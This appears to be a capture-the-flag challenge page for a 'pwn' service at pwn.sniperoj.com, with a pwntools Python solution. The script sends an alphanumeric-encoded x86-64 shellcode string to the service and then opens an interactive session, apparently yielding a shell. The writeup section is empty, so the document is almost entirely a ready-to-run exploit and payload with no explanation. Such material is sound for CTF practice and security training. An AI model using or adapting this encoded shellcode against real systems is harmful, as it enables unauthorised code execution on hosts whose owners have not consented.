#### Goals
 * Try to find the flag

#### Server Address
 * nc pwn.sniperoj.com 20004

#### Solution
```python

#!/usr/bin/env python

from pwn import *

context(os='linux', arch='amd64', log_level='debug')

if len(sys.argv) == 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
    Io = remote(host, port)
else:
    Io = process("./pwn")

shellcode = "TX-BTUU-BTUU-BTUUP\%IIII%0000-&%%%-%%%%-%%%%P%IIII%0000-+%%%-+%%%-*%%%P%IIII%0000-1(^e-1'^e-0'`gP%IIII%0000-3F52-3E42-2E42P%IIII%0000-FF/3-FE/2-EE.2P%IIII%0000-oQ:3-pQ:2-qQ:2P%IIII%0000-EgW^-EgW_-EhY`PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP"
payload = shellcode
Io.sendline(payload)
Io.interactive()
```

#### Writeups
 * TODO

